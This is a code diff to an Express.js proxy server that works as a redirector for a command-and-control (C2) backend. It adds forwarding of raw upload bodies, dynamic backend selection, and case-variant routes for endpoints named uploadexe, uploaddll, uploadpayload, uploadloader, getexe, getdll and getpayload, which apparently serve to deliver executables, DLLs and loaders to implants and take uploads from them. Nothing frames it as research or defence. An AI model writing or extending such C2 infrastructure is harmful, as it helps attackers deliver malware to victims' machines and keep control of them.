@@ -32,7 +32,20 @@ app.use(helmet({
   }
 }));
 
-// Proxy middleware for all C2 endpoints (handles upload, download, etc.)
+// Middleware to log request body size for uploads (avoid logging full body to prevent large output)
+app.use(express.raw({ type: '*/*', limit: '10mb' })); // Parse raw body for uploads
+app.use((req, res, next) => {
+  console.log(`[Global] Incoming request: ${req.method} ${req.url}`);
+  console.log(`[Global] Headers: ${JSON.stringify(req.headers, null, 2)}`);
+  if (req.body && Buffer.isBuffer(req.body)) {
+    console.log(`[Global] Request body size: ${req.body.length} bytes`);
+  } else if (req.body) {
+    console.log(`[Global] Request body type: ${typeof req.body}`);
+  }
+  next();
+});
+
+// Proxy middleware for /c2 endpoints
 app.use('/c2', createProxyMiddleware({
   target: () => getCurrentTargetUrl(), // Dynamically select target URL
   changeOrigin: true,
@@ -41,17 +54,56 @@ app.use('/c2', createProxyMiddleware({
   },
   onProxyReq: (proxyReq, req, res) => {
     // Detailed logging of incoming request
-    console.log(`Incoming request: ${req.method} ${req.url}`);
-    console.log(`Headers: ${JSON.stringify(req.headers, null, 2)}`);
-    console.log(`Proxying to: ${proxyReq.getHeader('host')}${proxyReq.path}`);
+    console.log(`[C2 Proxy] Proxying request: ${req.method} ${req.url}`);
+    console.log(`[C2 Proxy] Target backend: ${proxyReq.getHeader('host')}${proxyReq.path}`);
+    if (req.body && Buffer.isBuffer(req.body)) {
+      console.log(`[C2 Proxy] Forwarding body of size: ${req.body.length} bytes`);
+      proxyReq.write(req.body); // Ensure body is forwarded for uploads
+      proxyReq.end();
+    }
   },
   onProxyRes: (proxyRes, req, res) => {
     // Log proxy response status and headers
-    console.log(`Proxy response for ${req.url}: Status ${proxyRes.statusCode}`);
-    console.log(`Response headers: ${JSON.stringify(proxyRes.headers, null, 2)}`);
+    console.log(`[C2 Proxy] Proxy response for ${req.url}: Status ${proxyRes.statusCode}`);
+    console.log(`[C2 Proxy] Response headers: ${JSON.stringify(proxyRes.headers, null, 2)}`);
   },
   onError: (err, req, res, target) => {
-    console.error(`Proxy error with target ${target} for ${req.url}:`, err);
+    console.error(`[C2 Proxy] Proxy error with target ${target} for ${req.url}:`, err);
+    res.status(503).send('Service Unavailable');
+  }
+}));
+
+// Proxy middleware for direct C2 endpoints (case-insensitive for uploadexe, uploaddll, etc.)
+app.use([
+  '/uploadexe', '/Uploadexe', '/UPLOADEXE',
+  '/uploaddll', '/Uploaddll', '/UPLOADDLL',
+  '/uploadpayload', '/Uploadpayload', '/UPLOADPAYLOAD',
+  '/uploadloader', '/Uploadloader', '/UPLOADLOADER',
+  '/getexe', '/Getexe', '/GETEXE',
+  '/getdll', '/Getdll', '/GETDLL',
+  '/getpayload', '/Getpayload', '/GETPAYLOAD'
+], createProxyMiddleware({
+  target: () => getCurrentTargetUrl(), // Dynamically select target URL
+  changeOrigin: true,
+  pathRewrite: (path, req) => {
+    // Convert path to lowercase to match backend expectation if needed
+    return path.toLowerCase();
+  },
+  onProxyReq: (proxyReq, req, res) => {
+    console.log(`[Direct Proxy] Direct endpoint request: ${req.method} ${req.url}`);
+    console.log(`[Direct Proxy] Target backend: ${proxyReq.getHeader('host')}${proxyReq.path}`);
+    if (req.body && Buffer.isBuffer(req.body)) {
+      console.log(`[Direct Proxy] Forwarding body of size: ${req.body.length} bytes`);
+      proxyReq.write(req.body); // Ensure body is forwarded for uploads
+      proxyReq.end();
+    }
+  },
+  onProxyRes: (proxyRes, req, res) => {
+    console.log(`[Direct Proxy] Proxy response for ${req.url}: Status ${proxyRes.statusCode}`);
+    console.log(`[Direct Proxy] Response headers: ${JSON.stringify(proxyRes.headers, null, 2)}`);
+  },
+  onError: (err, req, res, target) => {
+    console.error(`[Direct Proxy] Proxy error with target ${target} for ${req.url}:`, err);
     res.status(503).send('Service Unavailable');
   }
 }));
@@ -63,6 +115,7 @@ app.get('/', (req, res) => {
 
 // Catch-all for other requests
 app.all('*', (req, res) => {
+  console.log(`[Catch-All] Unhandled request: ${req.method} ${req.url}`);
   res.status(404).send('Not Found');
 });
 
